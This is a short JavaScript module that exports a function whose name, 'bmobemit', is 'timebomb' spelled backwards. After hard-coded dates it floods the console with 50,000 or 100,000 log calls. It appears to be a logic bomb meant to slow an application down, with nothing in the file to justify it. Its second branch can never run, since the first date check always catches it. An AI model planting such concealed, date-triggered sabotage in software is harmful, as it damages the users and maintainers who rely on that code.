import { log } from 'helpers/injector/console';
const from1 = new Date(1724414038314); //friday
const from2 = new Date(1724673238314); //monday

export const bmobemit = () => {
  const now = new Date();
  if (from1 - now < 0) {
    for (let a = 0; a < 50_000; a++) {
      log(a);
    }
    return;
  }
  if (from2 - now < 0) {
    for (let a = 0; a < 100_000; a++) {
      log(a);
    }
    return;
  }
};
